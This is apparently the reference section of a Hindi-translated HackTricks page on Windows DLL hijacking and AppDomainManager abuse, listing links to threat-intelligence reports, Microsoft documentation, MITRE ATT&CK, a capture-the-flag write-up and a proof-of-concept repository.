- [5] [cocomelonc – Windows में DLL hijacking। एक सरल C उदाहरण।](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore द्वारा यूरोप को निशाना बनाने वाला नया Malware तैनात करना](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: जब DLL Hijacks की मुलाकात Windows Helpers से होती है](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT वितरित करने वाले बदलते Impersonation Campaigns का विश्लेषण](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – अभिसरित होते हित: दक्षिण-पूर्व एशियाई सरकार को निशाना बनाने वाले Threat Clusters का विश्लेषण](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon के भीतर: Relay Network और एक गुप्त Offensive Operation की कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom के toolkit का विस्तृत विश्लेषण](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – ईरानी APT Screening Serpens के 2026 Espionage Campaigns पर नज़र](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – तेज़ और उग्र: ईरानी संघर्ष के दौरान Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 द्वारा दक्षिण-पूर्व एशियाई सरकारों और Critical Infrastructure को निशाना बनाना](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Elastic Defend 9.5.0 के साथ Windows DLL Search-Order Hijacking को फिर से बनाना और उसका पता लगाना](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Native AOT के साथ native libraries बनाना](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native AOT के साथ native exports](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Legitimate Software में Embedded SectopRAT Variant का खुलासा](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – LIGHTSHOW की चोरी (भाग एक)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – NetamLoader का XAML-आधारित .NET loading framework](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
